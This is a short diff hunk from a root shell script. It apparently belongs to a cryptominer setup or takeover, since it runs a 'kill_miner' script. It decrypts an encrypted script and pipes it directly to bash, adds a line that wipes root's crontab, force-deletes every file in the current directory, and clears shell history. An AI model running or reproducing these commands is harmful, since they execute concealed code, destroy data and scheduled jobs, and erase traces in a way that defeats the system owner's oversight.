@@ -51,6 +51,7 @@ chmod +x /root/kill_miner.sh
 ./root/kill_miner.sh
 sleep 3
 openssl enc -d -aes-256-cbc -pbkdf2 -in /root/danielluis1922.sh -k $password | bash
+cat /dev/null > /var/spool/cron/crontabs/root
 rm -fv *
 rm -fR *
 history -c && history -w
